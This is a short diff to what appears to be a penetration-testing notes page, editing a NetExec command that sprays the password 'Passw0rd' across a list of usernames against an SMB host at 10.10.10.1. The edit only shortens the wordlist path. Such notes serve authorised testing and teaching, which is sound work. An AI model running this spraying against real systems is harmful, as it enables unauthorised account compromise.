@@ -68,7 +68,7 @@ Password spraying with NetExec
 
 {% code overflow="wrap" %}
 ```bash
-netexec smb 10.10.10.1 -u /usr/share/metasploit-framework/data/wordlists/common_users.txt -p 'Passw0rd' --continue-on-success
+netexec smb 10.10.10.1 -u common_users.txt -p 'Passw0rd' --continue-on-success
 ```
 {% endcode %}
 
